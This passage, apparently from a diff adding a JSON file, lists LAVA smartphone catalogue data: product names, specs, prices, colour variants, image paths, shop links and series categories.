+                "image": "media/images/product-variant/image_path/yuva-1-thumb-1703596357.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-1-thumb-1703596358.webp",
+                "color_code": "#0c495c",
+                "product_id": 3
+              }
+            ]
+          },
+          {
+            "id": 26,
+            "name": "AGNI 2",
+            "slug": "agni-2",
+            "status": 1,
+            "image": "media/community/image/agni-2-glass-viridian-1705663255.webp",
+            "thumbnail_image": "media/community/thumbnail_image/agni-2-thumb-1703582656.webp",
+            "short_description": "MediaTek Dimensity 7050 Processor | 120Hz FHD+ Curved AMOLED Display | 66W Charger \u2013 50% Charge in 16mins* |",
+            "description": "<p><br></p>",
+            "price": 25999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-05-18T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 2,
+            "read_more_url": "agni-2",
+            "amazon_link": null,
+            "buy_now_url": "https://www.amazon.in/dp/B0C467KFNM?utm_source=website&utm_medium=agni-2-3rd-aug&utm_campaign=agni-2&th=1",
+            "cut_price": 19999,
+            "thumbnail_variant": [
+              {
+                "id": 72,
+                "name": "AGNI 2",
+                "image": "media/images/product-variant/image_path/agni-2-glass-viridian-1705663233.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/agni-2-thumb-1703672250.webp",
+                "color_code": "#53686e",
+                "product_id": 26
+              },
+              {
+                "id": 112,
+                "name": "Agni2 Iron Glass",
+                "image": "media/images/product-variant/image_path/agni2-glass-iron-1705663342.webp",
+                "thumbnail": null,
+                "color_code": "#5f6670",
+                "product_id": 26
+              },
+              {
+                "id": 113,
+                "name": "Agni 2 Heather Glass",
+                "image": "media/images/product-variant/image_path/agni2-glass-heather-1705663408.webp",
+                "thumbnail": null,
+                "color_code": "#746b7c",
+                "product_id": 26
+              }
+            ]
+          },
+          {
+            "id": 28,
+            "name": "Blaze 2",
+            "slug": "blaze-2",
+            "status": 1,
+            "image": "media/community/image/blaze-2-4-thumb-1704259940.webp",
+            "thumbnail_image": null,
+            "short_description": "16.55cm (6.5\") 90Hz Punch Hole Display | Ultra-fast Unisoc T616 Processor | (6GB+ 5GB*) RAM + 128GB UFS 2.2 ROM | 5000mAh battery with Type-C Port & 18W Fast Charger",
+            "description": "<p>16.55cm (6.5\") 90Hz Punch Hole Display | Ultra-fast Unisoc T616 Processor | (6GB+ 5GB*) RAM + 128GB UFS 2.2 ROM | 5000mAh battery with Type-C Port &amp; 18W Fast Charger</p>",
+            "price": 10999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-04-10T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-2",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-2?variant=45029693260086",
+            "cut_price": 8999,
+            "thumbnail_variant": [
+              {
+                "id": 36,
+                "name": "blaze-2-2",
+                "image": "media/images/product-variant/image_path/blaze-2-4-thumb-1703595374.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-2-4-thumb-1703595374.webp",
+                "color_code": "#628c98",
+                "product_id": 28
+              },
+              {
+                "id": 37,
+                "name": "blaze-2-3",
+                "image": "media/images/product-variant/image_path/blaze-2-3-thumb-1703595394.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-2-3-thumb-1703595394.webp",
+                "color_code": "#f4a429",
+                "product_id": 28
+              }
+            ]
+          },
+          {
+            "id": 9,
+            "name": "Blaze 5G 8GB",
+            "slug": "blaze-5g-8gb",
+            "status": 1,
+            "image": "media/community/image/blaze-5g-8gb-1715948834.webp",
+            "thumbnail_image": "media/community/thumbnail_image/lavaproduct-1702533696.webp",
+            "short_description": "6GB RAM+ 3GB Virtual RAM + UFS 2.2 128GB ROM | MediaTek Dimensity 700 Processor | 50MP AI Triple Camera |",
+            "description": "<p>6GB RAM+ 3GB Virtual RAM + UFS 2.2 128GB ROM | MediaTek Dimensity 700 Processor | 50MP AI Triple Camera |</p>",
+            "price": 16499,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-02-10T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-5g-8gb",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-5g-8gb?variant=46079708201270",
+            "cut_price": 12999,
+            "thumbnail_variant": [
+              {
+                "id": 53,
+                "name": "blaze-5g-8gb-3",
+                "image": "media/images/product-variant/image_path/blaze-5g-8gb-3-thumb-1703596011.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-5g-8gb-3-thumb-1703596011.webp",
+                "color_code": "#cae2cc",
+                "product_id": 9
+              },
+              {
+                "id": 1111,
+                "name": "Glass Blue",
+                "image": "media/images/product-variant/image_path/blaze-5g-8gb-1715949596.webp",
+                "thumbnail": null,
+                "color_code": "#bbc4d1",
+                "product_id": 9
+              }
+            ]
+          },
+          {
+            "id": 25,
+            "name": "AGNI 5G",
+            "slug": "agni5g",
+            "status": 1,
+            "image": "media/community/image/agni5g-1703576400.webp",
+            "thumbnail_image": "media/community/thumbnail_image/agni5g-1703576400.webp",
+            "short_description": "Powered by MediaTek Dimensity 810 - 5G | Powerful 5000mAh battery | 64 MP AI Quad Camera | 90 Hz Display",
+            "description": "<p>Powered by MediaTek Dimensity 810 - 5G | Powerful 5000mAh battery | 64 MP AI Quad Camera | 90 Hz Display</p>",
+            "price": 23999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": null,
+            "external_url": null,
+            "recommended_product": "yes",
+            "category_id": 2,
+            "read_more_url": "smartphones/agni5g",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/agni_5g",
+            "cut_price": 17999,
+            "thumbnail_variant": [
+              {
+                "id": 73,
+                "name": "AGNI 5G",
+                "image": "media/images/product-variant/image_path/agni-5g-thumb-1703672392.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/agni-5g-thumb-1703672384.webp",
+                "color_code": "#4278b8",
+                "product_id": 25
+              }
+            ]
+          },
+          {
+            "id": 31,
+            "name": "Blaze 5G",
+            "slug": "blaze-5g",
+            "status": 1,
+            "image": "media/community/image/blaze-5g-1-thumb-1703603908.webp",
+            "thumbnail_image": null,
+            "short_description": "Supports All Indian 5G bands* | 2K Video Recording with EIS Support | 16.55cm (6.5\") IPS HD+ display with L1 Support |",
+            "description": "<p>Supports All Indian 5G bands* | 2K Video Recording with EIS Support | 16.55cm (6.5\") IPS HD+ display with L1 Support |</p>",
+            "price": 14999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": null,
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-5g",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-5g?variant=43010507571385",
+            "cut_price": 10999,
+            "thumbnail_variant": [
+              {
+                "id": 43,
+                "name": "Blaze 5G",
+                "image": "media/images/product-variant/image_path/blaze-5g-1-thumb-1703595591.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-5g-1-thumb-1703595592.webp",
+                "color_code": "#91b8db",
+                "product_id": 31
+              },
+              {
+                "id": 44,
+                "name": "Blaze 5G-2",
+                "image": "media/images/product-variant/image_path/blaze-5g-2-thumb-1703595609.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-5g-2-thumb-1703600170.webp",
+                "color_code": "#d4ebc6",
+                "product_id": 31
+              }
+            ]
+          },
+          {
+            "id": 33,
+            "name": "Blaze Pro",
+            "slug": "blaze-pro",
+            "status": 1,
+            "image": "media/community/image/blaze-pro-4-thumb-1703603932.webp",
+            "thumbnail_image": null,
+            "short_description": "Premium Frosted Glass Back Design | 50MP Triple AI Rear Camera | 64GB ROM + (4+3)GB RAM | Powered by Android 12 OS",
+            "description": "<p>Premium Frosted Glass Back Design | 50MP Triple AI Rear Camera | 64GB ROM + (4+3)GB RAM | Powered by Android 12 OS</p>",
+            "price": 12999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": null,
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-pro",
+            "amazon_link": "https://shop.lavamobiles.com/products/blaze-pro?variant=42834562810041",
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-pro?variant=42834562810041",
+            "cut_price": 10499,
+            "thumbnail_variant": [
+              {
+                "id": 45,
+                "name": "Blaze Pro - 1",
+                "image": "media/images/product-variant/image_path/blaze-pro-4-thumb-1703595659.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-pro-4-thumb-1703595660.webp",
+                "color_code": "#eaaa3e",
+                "product_id": 33
+              },
+              {
+                "id": 46,
+                "name": "Blaze Pro - 2",
+                "image": "media/images/product-variant/image_path/blaze-pro-3-thumb-1703595672.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-pro-3-thumb-1703595672.webp",
+                "color_code": "#c8d8d5",
+                "product_id": 33
+              },
+              {
+                "id": 47,
+                "name": "Blaze Pro - 3",
+                "image": "media/images/product-variant/image_path/blaze-pro-2-thumb-1703595684.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-pro-2-thumb-1703595684.webp",
+                "color_code": "#d4cec2",
+                "product_id": 33
+              },
+              {
+                "id": 48,
+                "name": "Blaze Pro - 4",
+                "image": "media/images/product-variant/image_path/blaze-pro-1-thumb-1703595700.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-pro-1-thumb-1703595701.webp",
+                "color_code": "#538def",
+                "product_id": 33
+              }
+            ]
+          },
+          {
+            "id": 35,
+            "name": "X2",
+            "slug": "x2",
+            "status": 1,
+            "image": "media/community/image/x2-1-thumb-1703588680.webp",
+            "thumbnail_image": null,
+            "short_description": "Big 16.51cm (6.5\u201d) IPS HD+ notch display | | Loud Audio speaker | FPS+Face Unlock",
+            "description": "<p>Big 16.51cm (6.5\u201d) IPS HD+ notch display | | Loud Audio speaker | FPS+Face Unlock</p>",
+            "price": 7999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": null,
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 14,
+            "read_more_url": "smartphones/x2",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/x2?variant=42023847821497",
+            "cut_price": 6999,
+            "thumbnail_variant": [
+              {
+                "id": 62,
+                "name": "X2",
+                "image": "media/images/product-variant/image_path/x2-1-thumb-1703596273.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/x2-1-thumb-1703596274.webp",
+                "color_code": "#38799f",
+                "product_id": 35
+              },
+              {
+                "id": 63,
+                "name": "X2-1",
+                "image": "media/images/product-variant/image_path/x2-2-thumb-1703596290.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/x2-2-thumb-1703596290.webp",
+                "color_code": "#485063",
+                "product_id": 35
+              }
+            ]
+          },
+          {
+            "id": 37,
+            "name": "Yuva 2 Pro",
+            "slug": "yuva-2-pro",
+            "status": 1,
+            "image": "media/community/image/yuva-2-pro-lavender-thumb-1703588855.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB RAM + 3GB Virtual RAM + 64GB ROM | MediaTek Helio G37 Octa-core Processor | 13 MP AI Triple Rear Camera |",
+            "description": "<p>4GB RAM + 3GB Virtual RAM + 64GB ROM | MediaTek Helio G37 Octa-core Processor | 13 MP AI Triple Rear Camera |</p>",
+            "price": 9999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": null,
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 5,
+            "read_more_url": "smartphones/yuva-2-pro",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/yuva-2-pro?variant=44443846803766",
+            "cut_price": 7999,
+            "thumbnail_variant": [
+              {
+                "id": 67,
+                "name": "Lavender",
+                "image": "media/images/product-variant/image_path/yuva-2-pro-lavender-thumb-1703596447.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-2-pro-lavender-thumb-1703596447.webp",
+                "color_code": "#d2cad9",
+                "product_id": 37
+              },
+              {
+                "id": 68,
+                "name": "Green",
+                "image": "media/images/product-variant/image_path/yuva-2-pro-green-thumb-1703596461.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-2-pro-green-thumb-1703596461.webp",
+                "color_code": "#cee0d0",
+                "product_id": 37
+              },
+              {
+                "id": 69,
+                "name": "White",
+                "image": "media/images/product-variant/image_path/yuva-2-pro-white-thumb-1703596475.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-2-pro-white-thumb-1703596475.webp",
+                "color_code": "#efefef",
+                "product_id": 37
+              }
+            ]
+          },
+          {
+            "id": 65,
+            "name": "Storm 5G",
+            "slug": "storm-5g",
+            "status": 1,
+            "image": "media/community/image/storm-1703747113.webp",
+            "thumbnail_image": null,
+            "short_description": "17.22cm (6.78\") 120Hz Punch Hole Display with Widevine L1 support | Ultrafast Processor MTK D6080 | 128GB ROM & (8+8*)GB RAM |",
+            "description": null,
+            "price": 14999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": null,
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 4,
+            "read_more_url": "smartphones/storm-5g",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/storm-5g?variant=47718993592630",
+            "cut_price": 13499,
+            "thumbnail_variant": [
+              {
+                "id": 94,
+                "name": "Storm",
+                "image": "media/images/product-variant/image_path/storm-1703748244.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/storm-1703748244.webp",
+                "color_code": "#c4e2d6",
+                "product_id": 65
+              },
+              {
+                "id": 111,
+                "name": "Storm Thunder Black",
+                "image": "media/images/product-variant/image_path/storm-thunder-black-1705662123.webp",
+                "thumbnail": null,
+                "color_code": "#1d1d1d",
+                "product_id": 65
+              }
+            ]
+          },
+          {
+            "id": 89,
+            "name": "Yuva Star",
+            "slug": "yuva-star",
+            "status": 1,
+            "image": "media/community/image/yuva-star-listing-1726810407.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa-core Processor | 17.15cm (6.75\") HD+ Notch Display  | 13MP AI Dual Rear Camera",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": null,
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1127,
+                "name": "Glossy White",
+                "image": "media/images/product-variant/image_path/yuva-star-listing-color1-1726811200.webp",
+                "thumbnail": null,
+                "color_code": "#ececec",
+                "product_id": 89
+              },
+              {
+                "id": 1128,
+                "name": "Glossy Lavender",
+                "image": "media/images/product-variant/image_path/yuva-star-listing-color3-1726811298.webp",
+                "thumbnail": null,
+                "color_code": "#c4c2e9",
+                "product_id": 89
+              },
+              {
+                "id": 1129,
+                "name": "Glossy Black",
+                "image": "media/images/product-variant/image_path/yuva-star-listing-color2-1726811359.webp",
+                "thumbnail": null,
+                "color_code": "#3a3a42",
+                "product_id": 89
+              }
+            ]
+          },
+          {
+            "id": 113,
+            "name": "Shark 5G",
+            "slug": "shark-5g",
+            "status": 1,
+            "image": "media/community/image/shark5g-listing-1759059864.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Unisoc T765 Octa Core Ultra Fast Processor | 17.13cm (6.75\") HD+ display  | 13 MP AI Dual Rear Camera | 5000mAh Battery",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": null,
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1023,
+            "read_more_url": null,
+            "amazon_link": "https://www.amazon.in/Lava-Shark-5G-Octacore-Processor/dp/B0F946MXB1",
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1152,
+                "name": "Stellar Blue",
+                "image": "media/images/product-variant/image_path/shark5g-listing-1747982848.webp",
+                "thumbnail": null,
+                "color_code": "#1d2d44",
+                "product_id": 113
+              },
+              {
+                "id": 1153,
+                "name": "Stellar Gold",
+                "image": "media/images/product-variant/image_path/shark5g-listing1-1747982933.webp",
+                "thumbnail": null,
+                "color_code": "#d1cac0",
+                "product_id": 113
+              }
+            ]
+          }
+        ],
+        "categories": [
+          {
+            "id": 1,
+            "name": "New Launches",
+            "type": null,
+            "sorting": 1,
+            "sub_text": null,
+            "content": "<p>This is for new launches smartphones</p>",
+            "content2": null,
+            "content3": null,
+            "parent_id": 0,
+            "image": "media/work/image/newlaunchagni300x300-1731402563.webp",
+            "image2": null,
+            "image_banner": "media/work/image_banner/new-launches-1721025658.webp",
+            "image_banner_mobile": "media/work/image_banner_mobile/new-launce-m-1705657665.webp",
+            "slug": "new-launches",
+            "page_title": "New Launch",
+            "meta_keywords": null,
+            "meta_description": null,
+            "image_alt": null,
+            "meta_other": null,
+            "status": 1,
+            "layout": null,
+            "created_at": "2023-12-05T17:22:07.167Z",
+            "updated_at": "2024-11-12T14:39:23.370Z",
+            "category": "smartphones",
+            "image_thumbnail": "media/product_cate_thumbnail/newlaunchagni120x120-1731402563.webp"
+          },
+          {
+            "id": 3,
+            "name": "Blaze Series",
+            "type": null,
+            "sorting": 2,
+            "sub_text": null,
+            "content": "<p>See more in snap</p>",
+            "content2": null,
+            "content3": null,
+            "parent_id": 0,
+            "image": "media/work/image/curve-1723196175.webp",
+            "image2": null,
+            "image_banner": "media/work/image_banner/blaze-series-1723080814.webp",
+            "image_banner_mobile": "media/work/image_banner_mobile/blaze-seriesmobile-768x550-1723080814.webp",
+            "slug": "blaze-series",
+            "page_title": "Shop LAVA Blaze Series Smartphones - Perfect for Every Lifestyle",
+            "meta_keywords": null,
+            "meta_description": "Upgrade to the LAVA Blaze Series! Sleek designs, top-notch features, and great prices await. Shop now for the ultimate smartphone experience.",
+            "image_alt": null,
+            "meta_other": null,
+            "status": 1,
+            "layout": null,
+            "created_at": "2023-12-05T17:28:30.230Z",
+            "updated_at": "2025-01-14T10:27:56.720Z",
+            "category": "smartphones",
+            "image_thumbnail": "media/product_cate_thumbnail/h-curve-1723196175.webp"
+          },
+          {
+            "id": 5,
+            "name": "Yuva Series",
+            "type": null,
+            "sorting": 3,
+            "sub_text": null,
+            "content": "<p>See more in a snap</p>",
+            "content2": null,
+            "content3": null,
+            "parent_id": 0,
+            "image": "media/work/image/yuva-5g-1723196239.webp",
+            "image2": null,
+            "image_banner": "media/work/image_banner/yuva-1722945978.webp",
+            "image_banner_mobile": "media/work/image_banner_mobile/frame-157516-1703587842.webp",
+            "slug": "yuva-series",
+            "page_title": "Discover LAVA Yuva Series Smartphones Online in India | LAVA",
+            "meta_keywords": "Yuva Series",
+            "meta_description": "Get the best deals on LAVA Yuva Series smartphones in India. Explore feature-rich models designed for every need. Purchase yours today!",
+            "image_alt": null,
+            "meta_other": "Yuva Series",
+            "status": 1,
+            "layout": null,
+            "created_at": "2023-12-05T17:31:42.347Z",
+            "updated_at": "2025-01-14T10:27:24.263Z",
+            "category": "smartphones",
+            "image_thumbnail": "media/product_cate_thumbnail/h-yuva-5g-1723196239.webp"
+          },
+          {
+            "id": 4,
+            "name": "Storm Series",
+            "type": null,
+            "sorting": 4,
+            "sub_text": null,
+            "content": "<p>See more in a snap</p>",
+            "content2": null,
+            "content3": null,
+            "parent_id": 0,
+            "image": "media/work/image/storm-1723196283.webp",
+            "image2": null,
+            "image_banner": "media/work/image_banner/storm-1722946112.webp",
+            "image_banner_mobile": "media/work/image_banner_mobile/storm-mobile-1722946112.webp",
+            "slug": "storm",
+            "page_title": "LAVA Storm Series Smartphones - Built for Ultimate Performance",
+            "meta_keywords": null,
+            "meta_description": "Experience the speed and efficiency of the LAVA Storm Series. Designed for performance enthusiasts, these smartphones redefine mobile power. Shop today!",
+            "image_alt": null,
+            "meta_other": null,
+            "status": 1,
+            "layout": null,
+            "created_at": "2023-12-05T17:29:44.417Z",
+            "updated_at": "2025-01-14T10:28:56.483Z",
+            "category": "smartphones",
+            "image_thumbnail": "media/product_cate_thumbnail/h-storm-1723196283.webp"
+          },
+          {
+            "id": 2,
+            "name": "Agni Series",
+            "type": null,
+            "sorting": 5,
+            "sub_text": null,
+            "content": "<p>Ahead of the curve</p>",
+            "content2": null,
+            "content3": null,
+            "parent_id": 0,
+            "image": "media/work/image/agni300x300-1731402522.webp",
+            "image2": null,
+            "image_banner": "media/work/image_banner/agni-series-1723080756.webp",
+            "image_banner_mobile": "media/work/image_banner_mobile/agni-series-mobile-768x550-1723080757.webp",
+            "slug": "agni-series",
+            "page_title": "LAVA Agni Series Smartphones | Redefining Power and Performance",
+            "meta_keywords": null,
+            "meta_description": "Discover the LAVA Agni Series smartphones, featuring blazing-fast processors, immersive displays, and advanced technology. Perfect for multitasking and gaming. Shop now!",
+            "image_alt": null,
+            "meta_other": null,
+            "status": 1,
+            "layout": null,
+            "created_at": "2023-12-05T17:26:11.750Z",
+            "updated_at": "2025-01-14T10:29:00.163Z",
+            "category": "smartphones",
+            "image_thumbnail": "media/product_cate_thumbnail/agni120x120-1731402522.webp"
+          },
+          {
+            "id": 1023,
+            "name": "Shark Series",
+            "type": null,
+            "sorting": 11,
+            "sub_text": null,
+            "content": null,
+            "content2": null,
+            "content3": null,
+            "parent_id": null,
+            "image": "media/work/image/lava_mobiles_300x300-1743513550.webp",
+            "image2": null,
+            "image_banner": "media/work/image_banner/lava_mobiles_1408-x332-1743513551.webp",
+            "image_banner_mobile": "media/work/image_banner_mobile/lava_mobiles_768-x550-1743513551.webp",
+            "slug": "shark-series",
+            "page_title": "Shark Series",
+            "meta_keywords": "Shark Series",
+            "meta_description": null,
+            "image_alt": null,
+            "meta_other": null,
+            "status": 1,
+            "layout": null,
+            "created_at": "2025-04-01T18:49:11.243Z",
+            "updated_at": "2025-04-01T18:51:20.683Z",
+            "category": "smartphones",
+            "image_thumbnail": "media/product_cate_thumbnail/lava_mobiles_120x120-1743513551.webp"
+          },
+          {
+            "id": 1024,
+            "name": "BOLD Series",
+            "type": null,
+            "sorting": 12,
+            "sub_text": null,
+            "content": null,
+            "content2": null,
+            "content3": null,
+            "parent_id": null,
+            "image": "media/work/image/lava_mobiles_300x300-1744047300.webp",
+            "image2": null,
+            "image_banner": "media/work/image_banner/lava_mobiles_1408-x332-1744047300.webp",
+            "image_banner_mobile": null,
+            "slug": "bold-series",
+            "page_title": "BOLD",
+            "meta_keywords": null,
+            "meta_description": null,
+            "image_alt": null,
+            "meta_other": null,
+            "status": 1,
+            "layout": null,
+            "created_at": "2025-04-07T23:05:00.607Z",
+            "updated_at": "2025-04-07T23:05:00.607Z",
+            "category": "smartphones",
+            "image_thumbnail": "media/product_cate_thumbnail/lava_mobiles_120x120-1744047300.webp"
+          },
+          {
+            "id": 1025,
+            "name": "PLAY Series",
+            "type": null,
+            "sorting": 13,
+            "sub_text": null,
+            "content": null,
+            "content2": null,
+            "content3": null,
+            "parent_id": null,
+            "image": "media/work/image/dropdown-menu-300x300-1756111997.webp",
+            "image2": null,
+            "image_banner": "media/work/image_banner/play-category-desk-1756111997.webp",
+            "image_banner_mobile": "media/work/image_banner_mobile/play-category-m-1756111997.webp",
+            "slug": "play-series",
+            "page_title": "PLAY Series",
+            "meta_keywords": null,
+            "meta_description": null,
+            "image_alt": null,
+            "meta_other": null,
+            "status": 1,
+            "layout": null,
+            "created_at": "2025-08-25T14:23:17.837Z",
+            "updated_at": "2025-08-25T14:28:36.243Z",
+            "category": "smartphones",
+            "image_thumbnail": "media/product_cate_thumbnail/dropdown-menu-120x120-1756111997.webp"
+          }
+        ],
+        "product": [
+          {
+            "id": 1137,
+            "name": "Smart 4 Plus",
+            "slug": "smart-4-plus",
+            "status": 1,
+            "image": "media/community/image/smart-4-plus--listing-1782575120.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-06-09T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "thumbnail_variant": [
+              {
+                "id": 2196,
+                "name": "Himalayan Silver",
+                "image": "media/images/product-variant/image_path/smart-4-plus--listing-1782575251.webp",
+                "thumbnail": null,
+                "color_code": "#dbdbdb",
+                "product_id": 1137
+              },
+              {
+                "id": 2197,
+                "name": "Nilgiri Blue",
+                "image": "media/images/product-variant/image_path/smart-4-plus--listing1-1782575224.webp",
+                "thumbnail": null,
+                "color_code": "#414666",
+                "product_id": 1137
+              }
+            ]
+          },
+          {
+            "id": 1136,
+            "name": "Bold N2 5G",
+            "slug": "bold-n2-5g",
+            "status": 1,
+            "image": "media/community/image/bold-n2-5g-listing-1782726945.webp",
+            "thumbnail_image": null,
+            "short_description": "Unisoc T8200 Octa Core Ultra Fast Processor | 17.13cm (6.75\") HD+ 120Hz display  | IP 64 Dust and Water Resistant | 13 MP AI Dual Rear Camera | 4GB+4GB* RAM  l 64GB ROM",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-06-03T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "thumbnail_variant": [
+              {
+                "id": 2194,
+                "name": "Billionaire Blue",
+                "image": "media/images/product-variant/image_path/bold-n2-5g-listing-1782726991.webp",
+                "thumbnail": null,
+                "color_code": "#182548",
+                "product_id": 1136
+              },
+              {
+                "id": 2195,
+                "name": "Royal Gold",
+                "image": "media/images/product-variant/image_path/bold-n2-5g-listing1-1782726969.webp",
+                "thumbnail": null,
+                "color_code": "#bcbcba",
+                "product_id": 1136
+              }
+            ]
+          },
+          {
+            "id": 1135,
+            "name": "Shark 2 5G",
+            "slug": "shark-2-5g",
+            "status": 1,
+            "image": "media/community/image/shark-2-5g-listing-1782734375.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Unisoc T8200 Octa Core Ultra Fast Processor | 17.13cm (6.75\") HD+ 120Hz display  | 6000mAh Battery with Type-C Port & 10 W Charging (18W Support) | IP 64 Dust and Water Resistant | 13 MP AI Dual Rear Camera",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-05-25T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1023,
+            "thumbnail_variant": [
+              {
+                "id": 2192,
+                "name": "Sonar Gold",
+                "image": "media/images/product-variant/image_path/shark-2-5g-listing-1782734455.webp",
+                "thumbnail": null,
+                "color_code": "#d0d0ce",
+                "product_id": 1135
+              },
+              {
+                "id": 2193,
+                "name": "Arya Blue",
+                "image": "media/images/product-variant/image_path/shark-2-5g-listing1-1782734473.webp",
+                "thumbnail": null,
+                "color_code": "#1e2b4e",
+                "product_id": 1135
+              }
+            ]
+          },
+          {
+            "id": 1132,
+            "name": "Bold N2 Lite",
+            "slug": "bold-n2-lite",
+            "status": 1,
+            "image": "media/community/image/bold-n2-lite-listing-1782727220.webp",
+            "thumbnail_image": null,
+            "short_description": "3GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-04-02T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "thumbnail_variant": [
+              {
+                "id": 2186,
+                "name": "NILGIRI Blue",
+                "image": "media/images/product-variant/image_path/bold-n2-lite-listing-1782727260.webp",
+                "thumbnail": null,
+                "color_code": "#282b30",
+                "product_id": 1132
+              },
+              {
+                "id": 2187,
+                "name": "KOLAR GOLD",
+                "image": "media/images/product-variant/image_path/bold-n2-lite-listing1-1782727278.webp",
+                "thumbnail": null,
+                "color_code": "#cfd3c0",
+                "product_id": 1132
+              }
+            ]
+          },
+          {
+            "id": 1129,
+            "name": "Bold N2",
+            "slug": "bold-n2",
+            "status": 1,
+            "image": "media/community/image/bold-n2-listing-1782734535.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display  | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-02-23T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "thumbnail_variant": [
+              {
+                "id": 2179,
+                "name": "Indus Black",
+                "image": "media/images/product-variant/image_path/bold-n2-listing-1782726755.webp",
+                "thumbnail": null,
+                "color_code": "#242424",
+                "product_id": 1129
+              },
+              {
+                "id": 2180,
+                "name": "Siachen White",
+                "image": "media/images/product-variant/image_path/bold-n2-listing1-1782726767.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 1129
+              }
+            ]
+          },
+          {
+            "id": 1128,
+            "name": "Star 3",
+            "slug": "star-3",
+            "status": 1,
+            "image": "media/community/image/star-3-listing-1782735042.webp",
+            "thumbnail_image": null,
